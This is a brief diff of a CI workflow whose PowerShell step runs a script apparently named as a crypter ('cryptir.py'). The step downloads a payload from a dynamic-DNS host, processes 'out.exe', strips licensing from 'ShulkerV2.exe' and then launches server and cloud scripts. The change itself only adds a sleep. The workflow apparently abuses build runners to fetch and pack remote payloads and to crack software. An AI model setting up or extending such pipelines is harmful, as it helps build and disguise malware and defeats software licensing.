@@ -241,6 +241,7 @@ jobs:
           $logFile1 = "C:\Users\runneradmin\FLAG\log1.txt"
           $logFile2 = "C:\Users\runneradmin\FLAG\log2.txt"
           Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cryptir.py', '--interval', '3600', '--sleep', '100', '--payload-url', 'http://heteronomous.kozow.com/files/sv2.dat', '--output', '.', '--input', 'out.exe', '--skip-obfuscation', '--unlicense-target', 'ShulkerV2.exe', '--patch-script', 'patch.py' -RedirectStandardOutput $logFile 
+          Start-Sleep -Seconds 10
           Start-Process -NoNewWindow py -ArgumentList '-3.11', 'server.py' -RedirectStandardOutput $logFile1 
           Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cloud.py' -RedirectStandardOutput $logFile2 
 
